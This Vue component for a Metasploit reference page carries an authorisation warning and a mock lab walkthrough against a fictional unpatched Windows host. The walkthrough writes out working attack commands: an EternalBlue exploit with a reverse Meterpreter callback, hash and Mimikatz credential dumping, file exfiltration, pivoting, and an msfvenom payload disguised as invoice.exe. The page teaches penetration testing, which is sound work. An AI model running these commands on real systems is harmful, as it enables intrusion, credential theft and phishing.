<script setup>
import data from "../../database/metasploit.json";

const moduleTypes = data.moduleTypes;
const consoleCommands = data.consoleCommands;
const payloadTaxonomy = data.payloadTaxonomy;
const msfvenomRecipes = data.msfvenomRecipes;
const meterpreterCommands = data.meterpreterCommands;
const engagementWorkflow = data.engagementWorkflow;
const tips = data.tips;
const limitations = data.limitations;
</script>

<template>
  <div class="page-shell" style="--accent: #2c8fcf">
    <div class="page">
      <header class="hdr">
        <div class="icon">⌖</div>
        <div>
          <h1>Metasploit</h1>
          <div class="sub">
            The exploitation framework — thousands of modules, a uniform
            console, and a Meterpreter session waiting on the other side.
          </div>
        </div>
        <a
          class="external"
          href="https://www.metasploit.com/"
          target="_blank"
          rel="noopener noreferrer"
        >
          Open homepage ↗
        </a>
      </header>

      <div class="warning">
        <strong>Authorisation required</strong>
        Running exploits against systems you do not own is illegal in most
        jurisdictions. Use Metasploit only in labs, CTFs, and engagements
        where you have explicit written permission to test.
      </div>

      <div class="callout">
        <strong>What it is</strong>
        Metasploit Framework is a modular system for offensive security:
        an <em>exploit</em> delivers a <em>payload</em>, which opens a
        <em>session</em>, which you then drive with <em>post</em> modules
        and Meterpreter commands. Maintained by Rapid7, ships with Kali,
        and runs as <code>msfconsole</code>.
      </div>

      <!-- How it works -->
      <section class="section">
        <h2>How it works</h2>
        <p class="prose">
          Metasploit is built around <strong>modules</strong> — discrete
          Ruby files for exploits, payloads, scanners, and post-exploitation
          actions, all loaded into a single console. You pick a module
          (<code>use …</code>), set its options (<code>set RHOSTS …</code>),
          and run it (<code>run</code> or <code>exploit</code>). Successful
          exploits open a <em>session</em>, typically a Meterpreter — an
          in-memory C2 channel with a rich built-in command set. The
          framework also exposes a <strong>workspace database</strong>
          that records hosts, services, vulnerabilities, credentials, and
          loot per engagement, queryable from the console.
        </p>
      </section>

      <!-- Anatomy -->
      <section class="section">
        <h2>Anatomy of an exploit run</h2>
        <div class="anatomy">
          <code class="anatomy__cmd">
            <span class="hl">use</span> exploit/windows/smb/ms17_010_eternalblue<br />
            <span class="hl">set</span> RHOSTS 10.0.0.5<br />
            <span class="hl">set</span> PAYLOAD windows/x64/meterpreter/reverse_tcp<br />
            <span class="hl">set</span> LHOST 10.0.0.99<br />
            <span class="hl">exploit -j</span>
          </code>
          <div class="anatomy__legend">
            <div><code class="hl">use</code> — load the module</div>
            <div><code class="hl">RHOSTS</code> — target(s)</div>
            <div><code class="hl">PAYLOAD</code> — what runs on the target</div>
            <div><code class="hl">LHOST</code> — your callback address</div>
            <div><code class="hl">exploit -j</code> — fire and background the handler</div>
          </div>
        </div>
      </section>

      <!-- Module types -->
      <section class="section">
        <h2>Module types</h2>
        <p class="prose">
          Every module in Metasploit belongs to a category that determines
          where it slots into the workflow. Knowing the taxonomy makes
          <code>search</code> queries far more productive.
        </p>
        <div class="modes">
          <article v-for="m in moduleTypes" :key="m.name" class="mode">
            <div class="mode__head">
              <h3>{{ m.name }}</h3>
            </div>
            <p class="mode__sum">{{ m.summary }}</p>
            <p class="mode__when">
              <strong>Example:</strong>
              <code>{{ m.example }}</code>
            </p>
          </article>
        </div>
      </section>

      <!-- Console commands -->
      <section class="section">
        <h2>Console commands</h2>
        <p class="prose">
          The flow inside <code>msfconsole</code>: search, load, configure,
          run, manage sessions. <code>help</code> at any prompt lists what
          applies in the current context.
        </p>
        <div class="table-wrap">
          <table class="tbl">
            <thead>
              <tr>
                <th>Command</th>
                <th>What it does</th>
              </tr>
            </thead>
            <tbody>
              <tr v-for="c in consoleCommands" :key="c.cmd">
                <td><code class="hl">{{ c.cmd }}</code></td>
                <td>{{ c.description }}</td>
              </tr>
            </tbody>
          </table>
        </div>
      </section>

      <!-- Payload taxonomy -->
      <section class="section">
        <h2>Payload taxonomy</h2>
        <p class="prose">
          Two binary choices shape every payload string:
          <strong>staged vs stageless</strong> (how it lands) and
          <strong>reverse vs bind</strong> (which way the connection
          flows). Read the slashes in the payload path to decode it.
        </p>
        <div class="modes">
          <article v-for="p in payloadTaxonomy" :key="p.label" class="mode">
            <div class="mode__head">
              <h3>{{ p.label }}</h3>
              <code class="hl">{{ p.syntax }}</code>
            </div>
            <p class="mode__sum">{{ p.summary }}</p>
          </article>
        </div>
      </section>

      <!-- msfvenom recipes -->
      <section class="section">
        <h2>msfvenom recipes</h2>
        <p class="prose">
          <code>msfvenom</code> generates standalone payload artefacts
          (EXE, ELF, PHP, raw shellcode, etc.) outside the console. Pair
          each one with <code>exploit/multi/handler</code> in
          <code>msfconsole</code> configured for the same payload + LHOST
          + LPORT to catch the callback.
        </p>
        <div class="recipes">
          <article v-for="r in msfvenomRecipes" :key="r.title" class="rcard">
            <h3>{{ r.title }}</h3>
            <pre class="rcard__cmd"><code>{{ r.command }}</code></pre>
            <p>{{ r.details }}</p>
          </article>
        </div>
      </section>

      <!-- Meterpreter -->
      <section class="section">
        <h2>Meterpreter command set</h2>
        <p class="prose">
          Once a Meterpreter session opens, you're driving an in-memory C2
          with file transfer, process control, credential harvesting, and
          pivoting baked in. The most-used commands across most
          engagements:
        </p>
        <div class="table-wrap">
          <table class="tbl">
            <thead>
              <tr>
                <th>Command</th>
                <th>What it does</th>
              </tr>
            </thead>
            <tbody>
              <tr v-for="m in meterpreterCommands" :key="m.cmd">
                <td><code class="hl">{{ m.cmd }}</code></td>
                <td>{{ m.description }}</td>
              </tr>
            </tbody>
          </table>
        </div>
      </section>

      <!-- Engagement workflow -->
      <section class="section">
        <h2>Engagement workflow</h2>
        <p class="prose">
          A typical Metasploit-led engagement loop — recon into the
          database, pick a target from queryable services, configure,
          fire, operate the session, and pivot deeper.
        </p>
        <div class="recipes">
          <article
            v-for="(s, i) in engagementWorkflow"
            :key="s.step"
            class="rcard"
          >
            <h3>{{ i + 1 }}. {{ s.step }}</h3>
            <p>{{ s.details }}</p>
            <pre class="rcard__cmd"><code>{{ s.snippet }}</code></pre>
          </article>
        </div>
      </section>

      <!-- Mock walkthrough -->
      <section class="section">
        <h2>Mock walkthrough — lab engagement</h2>
        <p class="prose">
          A fictional end-to-end run against a deliberately vulnerable
          Windows lab host (<code>10.0.0.5</code>, unpatched Windows 7,
          MS17-010 / EternalBlue exposed). Attacker IP is
          <code>10.0.0.99</code>. Each step calls out the Metasploit
          features being used.
        </p>

        <article class="walk">
          <header class="walk__head">
            <span class="walk__num">1</span>
            <h3>Boot the console &amp; create a workspace</h3>
          </header>
          <p class="walk__desc">
            Workspaces are per-engagement folders for the database — keeps
            hosts, services, creds, and loot from bleeding between cases.
            <code>setg</code> stores values globally so we don't repeat
            them per module.
          </p>
          <pre class="walk__cmd"><code>msfconsole -q                          # quiet banner
workspace -a lab-eternalblue           # create + switch to workspace
db_status                              # confirm postgres is connected
setg LHOST 10.0.0.99                   # our callback IP, sticky
setg RHOSTS 10.0.0.0/24                # default target range</code></pre>
          <p class="walk__feat"><strong>Touches:</strong> msfconsole, workspaces, postgres-backed database, global options.</p>
        </article>

        <article class="walk">
          <header class="walk__head">
            <span class="walk__num">2</span>
            <h3>Recon directly into the database</h3>
          </header>
          <p class="walk__desc">
            <code>db_nmap</code> wraps nmap and imports results straight
            into the workspace, so every later module can query hosts and
            services without re-scanning.
          </p>
          <pre class="walk__cmd"><code>db_nmap -sV -O 10.0.0.0/24             # service + OS detection
hosts                                  # list discovered hosts
services -p 445                        # SMB-speaking hosts
services -p 445 -R                     # set RHOSTS to those hosts</code></pre>
          <p class="walk__feat"><strong>Touches:</strong> <code>db_nmap</code>, <code>hosts</code>, <code>services</code>, <code>-R</code> auto-RHOSTS.</p>
        </article>

        <article class="walk">
          <header class="walk__head">
            <span class="walk__num">3</span>
            <h3>Search &amp; pre-flight with an auxiliary scanner</h3>
          </header>
          <p class="walk__desc">
            Always confirm vulnerability with a non-destructive auxiliary
            scanner before firing the real exploit. Many SMB exploits
            crash unpatched targets if they were never vulnerable.
          </p>
          <pre class="walk__cmd"><code>search cve:2017 type:exploit smb       # filter the catalog
use auxiliary/scanner/smb/smb_ms17_010 # the safe checker
run                                    # confirms 10.0.0.5 vulnerable
vulns                                  # workspace now records the finding</code></pre>
          <p class="walk__feat"><strong>Touches:</strong> <code>search</code> filters, auxiliary scanners, <code>vulns</code> table.</p>
        </article>

        <article class="walk">
          <header class="walk__head">
            <span class="walk__num">4</span>
            <h3>Configure the exploit</h3>
          </header>
          <p class="walk__desc">
            Inspect the module before running it. <code>info</code> shows
            references and ranking, <code>show targets</code> lists the
            OS / service-pack profiles, <code>show payloads</code> filters
            the payload list to compatible ones.
          </p>
          <pre class="walk__cmd"><code>use exploit/windows/smb/ms17_010_eternalblue
info                                   # description, refs, rank: average
show targets                           # auto-target OK
show payloads                          # compatible payloads only
set RHOSTS 10.0.0.5
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LPORT 4444
show options                           # final sanity check
check                                  # non-intrusive probe -> Vulnerable</code></pre>
          <p class="walk__feat"><strong>Touches:</strong> <code>use</code>, <code>info</code>, <code>show targets/payloads/options</code>, <code>check</code>.</p>
        </article>

        <article class="walk">
          <header class="walk__head">
            <span class="walk__num">5</span>
            <h3>Fire — and background the handler</h3>
          </header>
          <p class="walk__desc">
            <code>exploit -j</code> runs the module as a background job so
            the console stays usable. <code>jobs</code> lists active
            handlers; <code>sessions</code> tracks landed shells.
          </p>
          <pre class="walk__cmd"><code>exploit -j                             # backgrounded handler
[*] Started reverse TCP handler on 10.0.0.99:4444
[*] Meterpreter session 1 opened
sessions -l                            # session 1: 10.0.0.5 -> NT AUTHORITY\SYSTEM (already!)
sessions -i 1                          # interact</code></pre>
          <p class="walk__feat"><strong>Touches:</strong> <code>exploit -j</code>, <code>jobs</code>, <code>sessions -l/-i</code>.</p>
        </article>

        <article class="walk">
          <header class="walk__head">
            <span class="walk__num">6</span>
            <h3>Operate the Meterpreter session</h3>
          </header>
          <p class="walk__desc">
            EternalBlue lands as SYSTEM directly so we skip
            <code>getsystem</code>. Migrate out of the spawned process
            into something stable (<code>lsass.exe</code> or
            <code>winlogon.exe</code>) before the original is reaped.
          </p>
          <pre class="walk__cmd"><code>sysinfo                                # OS, arch, domain, build
getuid                                 # NT AUTHORITY\SYSTEM
ps                                     # find a stable host process
migrate 656                            # winlogon.exe PID
screenshot                             # capture desktop
hashdump                               # dump SAM hashes
download C:/Users/admin/secret.docx    # exfil a file
upload tools/mimikatz.exe C:/Windows/Temp/  # stage a tool</code></pre>
          <p class="walk__feat"><strong>Touches:</strong> <code>sysinfo</code>, <code>getuid</code>, <code>ps</code>, <code>migrate</code>, <code>screenshot</code>, <code>hashdump</code>, <code>upload/download</code>.</p>
        </article>

        <article class="walk">
          <header class="walk__head">
            <span class="walk__num">7</span>
            <h3>Load Kiwi for in-memory credentials</h3>
          </header>
          <p class="walk__desc">
            The <code>kiwi</code> extension is the Mimikatz port — pulls
            plaintext credentials, Kerberos tickets, and DPAPI material
            from <code>lsass</code> memory. Requires SYSTEM and an x64
            session matching the target.
          </p>
          <pre class="walk__cmd"><code>load kiwi
creds_all                              # plaintext + NTLM + tickets
kerberos_ticket_list
lsa_dump_secrets                       # cached service creds
exit                                   # leave kiwi, back to meterpreter</code></pre>
          <p class="walk__feat"><strong>Touches:</strong> Meterpreter extensions, <code>kiwi</code> / Mimikatz integration.</p>
        </article>

        <article class="walk">
          <header class="walk__head">
            <span class="walk__num">8</span>
            <h3>Capture loot into the workspace</h3>
          </header>
          <p class="walk__desc">
            Post modules harvest data and store it in the
            <code>creds</code> / <code>loot</code> / <code>notes</code>
            tables, which survive across console restarts and can be
            grepped for the report.
          </p>
          <pre class="walk__cmd"><code>background                             # session -> background
use post/windows/gather/hashdump
set SESSION 1
run
use post/windows/gather/credentials/credential_collector
set SESSION 1
run
creds                                  # everything captured this engagement
loot                                   # downloaded files indexed</code></pre>
          <p class="walk__feat"><strong>Touches:</strong> <code>post/</code> modules, <code>SESSION</code> targeting, <code>creds</code> / <code>loot</code> tables.</p>
        </article>

        <article class="walk">
          <header class="walk__head">
            <span class="walk__num">9</span>
            <h3>Pivot deeper into the internal subnet</h3>
          </header>
          <p class="walk__desc">
            Now that we're on <code>10.0.0.5</code>, route the
            <code>10.0.1.0/24</code> internal subnet through that session
            so other Metasploit modules (and SOCKS-aware tools) can reach
            it without needing direct connectivity.
          </p>
          <pre class="walk__cmd"><code>route add 10.0.1.0/24 1                # route subnet via session 1
route print
use auxiliary/server/socks_proxy        # SOCKS5 for external tools
set SRVPORT 1080
run -j

# Scan inside via the pivot:
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.0.1.0/24
set PORTS 22,80,443,445,3389
run

# Forward an internal RDP to localhost:
sessions -i 1
portfwd add -l 33389 -p 3389 -r 10.0.1.20</code></pre>
          <p class="walk__feat"><strong>Touches:</strong> <code>route</code>, SOCKS proxy module, <code>portfwd</code>, scanning over a pivot.</p>
        </article>

        <article class="walk">
          <header class="walk__head">
            <span class="walk__num">10</span>
            <h3>Generate a custom payload with msfvenom</h3>
          </header>
          <p class="walk__desc">
            For an alternate access vector (a phishing attachment or
            staged web shell), build a standalone payload outside the
            console and catch it with <code>multi/handler</code> in
            msfconsole. The handler config has to match the payload
            exactly.
          </p>
          <pre class="walk__cmd"><code># In a separate terminal:
msfvenom -p windows/x64/meterpreter_reverse_https \
         LHOST=10.0.0.99 LPORT=443 \
         -f exe -o invoice.exe

# Back in msfconsole:
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter_reverse_https
set LHOST 10.0.0.99
set LPORT 443
exploit -j</code></pre>
          <p class="walk__feat"><strong>Touches:</strong> <code>msfvenom</code>, stageless HTTPS payload, <code>exploit/multi/handler</code>.</p>
        </article>

        <article class="walk">
          <header class="walk__head">
            <span class="walk__num">11</span>
            <h3>Save the playbook for next time</h3>
          </header>
          <p class="walk__desc">
            <code>resource</code> files replay any sequence of console
            commands, so a repeatable engagement scaffold (workspace,
            globals, db_nmap, listeners) becomes a single command.
          </p>
          <pre class="walk__cmd"><code># In ~/playbooks/lab.rc:
workspace -a lab-eternalblue
setg LHOST 10.0.0.99
db_nmap -sV 10.0.0.0/24
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LPORT 4444
exploit -j

# Then:
msfconsole -q -r ~/playbooks/lab.rc</code></pre>
          <p class="walk__feat"><strong>Touches:</strong> <code>resource</code> scripts, <code>-r</code> startup flag, automation.</p>
        </article>

        <article class="walk">
          <header class="walk__head">
            <span class="walk__num">12</span>
            <h3>Wrap up &amp; export the report</h3>
          </header>
          <p class="walk__desc">
            Everything captured during the engagement lives in the
            workspace. Export it for the report and clean up sessions and
            jobs before exiting.
          </p>
          <pre class="walk__cmd"><code>db_export -f xml lab-eternalblue.xml   # full workspace dump
creds -o creds.csv                     # CSV of captured credentials
loot                                   # downloaded artefact paths
notes                                  # free-form findings
sessions -K                            # kill all sessions
jobs -K                                # kill all background jobs
exit</code></pre>
          <p class="walk__feat"><strong>Touches:</strong> <code>db_export</code>, <code>creds -o</code>, <code>notes</code>, session / job teardown.</p>
        </article>
      </section>

      <!-- Tips -->
      <section class="section">
        <h2>Tips &amp; gotchas</h2>
        <ul class="bulletlist">
          <li v-for="t in tips" :key="t">{{ t }}</li>
        </ul>
      </section>

      <!-- Limitations -->
      <section class="section">
        <h2>Limitations</h2>
        <ul class="bulletlist bulletlist--warn">
          <li v-for="l in limitations" :key="l">{{ l }}</li>
        </ul>
      </section>

      <footer class="ft">
        Reference data sourced from <code>database/metasploit.json</code>
      </footer>
    </div>
  </div>
</template>

<style scoped>
.hdr {
  position: relative;
}
.external {
  position: absolute;
  top: 0;
  right: 0;
  font-family: var(--sans);
  font-size: 10.5px;
  font-weight: 600;
  text-transform: uppercase;
  letter-spacing: 0.08em;
  color: var(--accent);
  text-decoration: none;
  border: 1px solid var(--accent);
  border-radius: 999px;
  padding: 5px 10px;
  background: color-mix(in srgb, var(--accent) 14%, transparent);
}
.external:hover {
  background: color-mix(in srgb, var(--accent) 24%, transparent);
}
@media (max-width: 640px) {
  .external {
    position: static;
    align-self: flex-start;
    margin-top: 6px;
  }
}

.warning {
  background: color-mix(in srgb, #d14c4c 10%, transparent);
  border: 1px solid #d14c4c;
  border-radius: 8px;
  padding: 12px 14px;
  font-size: 11.5px;
  color: var(--tx);
  margin-bottom: 18px;
  line-height: 1.6;
}
.warning strong {
  color: #ff8a8a;
  font-family: var(--sans);
  font-size: 10px;
  text-transform: uppercase;
  letter-spacing: 0.1em;
  display: block;
  margin-bottom: 4px;
}

.callout {
  background: var(--sf2);
  border: 1px solid var(--bd);
  border-left: 2px solid var(--accent);
  border-radius: 8px;
  padding: 12px 14px;
  font-size: 11.5px;
  color: var(--dm);
  margin-bottom: 24px;
}
.callout strong {
  color: var(--accent);
  font-family: var(--sans);
  font-size: 10px;
  text-transform: uppercase;
  letter-spacing: 0.1em;
  display: block;
  margin-bottom: 4px;
}
.callout em {
  color: var(--tx);
  font-style: italic;
}
.callout code {
  background: var(--bg);
  border: 1px solid var(--bd);
  border-radius: 4px;
  padding: 1px 5px;
  font-size: 11px;
  color: var(--accent);
}

.section {
  margin-bottom: 32px;
}
.section h2 {
  font-family: var(--sans);
  font-size: 15px;
  font-weight: 700;
  color: #fff;
  letter-spacing: 0.02em;
  margin: 0 0 12px;
}

.prose {
  color: var(--tx);
  font-size: 12.5px;
  line-height: 1.7;
  margin: 0 0 12px;
}
.prose code {
  background: var(--bg);
  border: 1px solid var(--bd);
  border-radius: 4px;
  padding: 1px 5px;
  font-size: 11.5px;
  color: #9cdcfe;
}
.prose strong {
  color: #fff;
}
.prose em {
  color: var(--accent);
  font-style: normal;
}

/* Anatomy */
.anatomy {
  background: var(--sf);
  border: 1px solid var(--bd);
  border-radius: 10px;
  padding: 14px 16px;
  display: flex;
  flex-direction: column;
  gap: 12px;
}
.anatomy__cmd {
  font-family: var(--mono);
  font-size: 13px;
  color: var(--tx);
  display: block;
  word-break: break-all;
  line-height: 1.7;
}
.anatomy__cmd .hl {
  color: var(--accent);
  font-weight: 600;
}
.anatomy__legend {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
  gap: 6px 16px;
  font-size: 11.5px;
  color: var(--dm);
}
.anatomy__legend code {
  background: var(--bg);
  border: 1px solid var(--bd);
  border-radius: 4px;
  padding: 0 5px;
  font-size: 11px;
  color: var(--accent);
  margin-right: 6px;
}

/* Module / payload cards */
.modes {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
  gap: 12px;
}
.mode {
  background: var(--sf);
  border: 1px solid var(--bd);
  border-top: 2px solid var(--accent);
  border-radius: 10px;
  padding: 12px 14px;
  display: flex;
  flex-direction: column;
  gap: 8px;
}
.mode__head {
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 8px;
  flex-wrap: wrap;
}
.mode__head h3 {
  margin: 0;
  font-family: var(--sans);
  font-size: 12.5px;
  font-weight: 700;
  color: #fff;
}
.mode__head code {
  font-family: var(--mono);
  font-size: 11px;
  color: var(--accent);
  background: var(--bg);
  border: 1px solid var(--bd);
  border-radius: 4px;
  padding: 1px 6px;
}
.mode__sum {
  margin: 0;
  font-size: 11.5px;
  line-height: 1.6;
  color: var(--tx);
}
.mode__when {
  margin: 0;
  font-size: 11px;
  line-height: 1.5;
  color: var(--dm);
}
.mode__when strong {
  color: var(--accent);
  font-family: var(--sans);
  font-size: 10px;
  text-transform: uppercase;
  letter-spacing: 0.08em;
  margin-right: 4px;
}
.mode__when code {
  background: var(--bg);
  border: 1px solid var(--bd);
  border-radius: 4px;
  padding: 1px 5px;
  font-size: 11px;
  color: #9cdcfe;
}

/* Tables */
.table-wrap {
  overflow-x: auto;
  border: 1px solid var(--bd);
  border-radius: 8px;
  background: var(--sf);
}
.tbl {
  width: 100%;
  border-collapse: collapse;
  font-size: 12px;
}
.tbl th,
.tbl td {
  text-align: left;
  padding: 8px 12px;
  border-bottom: 1px solid var(--bd);
  vertical-align: top;
}
.tbl thead th {
  background: var(--sf2);
  font-family: var(--sans);
  font-size: 10px;
  font-weight: 700;
  letter-spacing: 0.1em;
  text-transform: uppercase;
  color: var(--dm);
}
.tbl tbody tr:last-child td {
  border-bottom: 0;
}
.tbl tbody tr:hover {
  background: var(--sf2);
}
.tbl code {
  background: var(--bg);
  border: 1px solid var(--bd);
  border-radius: 4px;
  padding: 1px 5px;
  font-size: 11px;
  color: #9cdcfe;
  white-space: nowrap;
}
.tbl code.hl {
  color: var(--accent);
  border-color: var(--accent);
}

/* Recipes / workflow cards */
.recipes {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
  gap: 12px;
}
.rcard {
  background: var(--sf);
  border: 1px solid var(--bd);
  border-top: 2px solid var(--accent);
  border-radius: 10px;
  padding: 12px 14px;
  display: flex;
  flex-direction: column;
  gap: 8px;
}
.rcard h3 {
  margin: 0;
  font-family: var(--sans);
  font-size: 12.5px;
  font-weight: 700;
  color: #fff;
}
.rcard__cmd {
  margin: 0;
  background: var(--bg);
  border: 1px solid var(--bd);
  border-radius: 6px;
  padding: 8px 10px;
  font-family: var(--mono);
  font-size: 11.5px;
  color: var(--accent);
  overflow-x: auto;
  white-space: pre;
}
.rcard p {
  margin: 0;
  font-size: 11.5px;
  line-height: 1.6;
  color: var(--tx);
}

/* Walkthrough */
.walk {
  background: var(--sf);
  border: 1px solid var(--bd);
  border-left: 2px solid var(--accent);
  border-radius: 10px;
  padding: 14px 16px;
  margin-bottom: 12px;
  display: flex;
  flex-direction: column;
  gap: 10px;
}
.walk__head {
  display: flex;
  align-items: center;
  gap: 12px;
  margin: 0;
}
.walk__num {
  flex-shrink: 0;
  width: 26px;
  height: 26px;
  border-radius: 999px;
  background: color-mix(in srgb, var(--accent) 18%, transparent);
  border: 1px solid var(--accent);
  color: var(--accent);
  font-family: var(--sans);
  font-size: 11px;
  font-weight: 700;
  display: flex;
  align-items: center;
  justify-content: center;
}
.walk__head h3 {
  margin: 0;
  font-family: var(--sans);
  font-size: 13px;
  font-weight: 700;
  color: #fff;
}
.walk__desc {
  margin: 0;
  font-size: 12px;
  line-height: 1.65;
  color: var(--tx);
}
.walk__desc code {
  background: var(--bg);
  border: 1px solid var(--bd);
  border-radius: 4px;
  padding: 1px 5px;
  font-size: 11px;
  color: #9cdcfe;
}
.walk__cmd {
  margin: 0;
  background: var(--bg);
  border: 1px solid var(--bd);
  border-radius: 6px;
  padding: 10px 12px;
  font-family: var(--mono);
  font-size: 11.5px;
  color: var(--accent);
  overflow-x: auto;
  white-space: pre;
  line-height: 1.55;
}
.walk__feat {
  margin: 0;
  font-size: 11px;
  color: var(--dm);
  line-height: 1.5;
}
.walk__feat strong {
  color: var(--accent);
  font-family: var(--sans);
  font-size: 10px;
  text-transform: uppercase;
  letter-spacing: 0.08em;
  margin-right: 4px;
}
.walk__feat code {
  background: var(--bg);
  border: 1px solid var(--bd);
  border-radius: 4px;
  padding: 1px 5px;
  font-size: 10.5px;
  color: var(--accent);
  margin: 0 1px;
}

/* Bullet lists */
.bulletlist {
  margin: 0;
  padding: 12px 14px 12px 30px;
  background: var(--sf);
  border: 1px solid var(--bd);
  border-left: 2px solid var(--accent);
  border-radius: 8px;
  display: flex;
  flex-direction: column;
  gap: 6px;
}
.bulletlist li {
  font-size: 12px;
  color: var(--tx);
  line-height: 1.6;
}
.bulletlist--warn {
  border-left-color: #d14c4c;
}
</style>
